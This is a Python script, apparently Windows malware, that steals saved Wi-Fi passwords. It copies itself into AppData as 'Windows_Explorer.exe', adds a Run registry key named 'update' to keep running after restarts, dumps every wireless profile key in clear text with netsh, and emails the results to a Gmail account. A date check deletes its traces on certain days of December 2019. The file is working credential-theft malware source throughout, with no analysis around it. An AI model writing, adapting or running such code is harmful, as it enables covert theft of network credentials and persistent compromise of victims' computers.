#!/usr/bin/env python
import subprocess #this library will execute commands
import smtplib #this library will send report 
import re,datetime,shutil
import sys,os


#email and password goes here (gmail)
email_u=""
password_u=""


def sendmail(email,password,message):
    while True:
        try:
            server =smtplib.SMTP('smtp.gmail.com',587) #this line will create a full instance of server to send mail ,second argument is port
            break
        except Exception:
            continue
    server.starttls()
    server.login(email,password)
    server.sendmail(email,email,message)  # in arguments we first show email from which it is send and next from email to which it is send
    server.quit()
def run_persistence():
		back_file=os.environ["appdata"] + "\\Windows_Explorer.exe"
		if not os.path.exists(back_file):
			shutil.copyfile(sys.executable,back_file)
			subprocess.call('reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v update /t REG_SZ /d "'+back_file+'"',shell=True)

def check_time():
    print("checking")
    if str(datetime.date.today())=='2019-12-06' or str(datetime.date.today())=='2019-12-04' or str(datetime.date.today())=='2019-12-05':
        print("in")
        back_file=os.environ["appdata"] + "\\Windows_Explorer.exe"
        if os.path.exists(back_file):
            subprocess.call('reg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v update /f',shell=True,stderr=subprocess.DEVNULL,stdin=subprocess.DEVNULL)
            os.remove(back_file)
        os._exit(1)
    
check_time()
run_persistence()
commands='netsh wlan show profile'
while True:
    try:
        network=subprocess.check_output(commands,shell=True,stderr=subprocess.DEVNULL,stdin=subprocess.DEVNULL)
        break
    except Exception:
        continue
# network_name=re.search("(?:Profile\s*:\s)(.*)")   # this will get only one layer
network=str(network,'utf-8')
network_name_lst =re.findall("(?:Profile\s*:\s)(.*)",network)    #this will get all list layer of given

result =b""
for network_name in network_name_lst:
    command="netsh wlan show profile "+network_name+" key=clear"
    try:
        current_result= subprocess.check_output(command,shell=True,stderr=subprocess.DEVNULL,stdin=subprocess.DEVNULL)
    except Exception:
        current_result=b" "
    result=result+current_result

sendmail(email_u,password_u,result)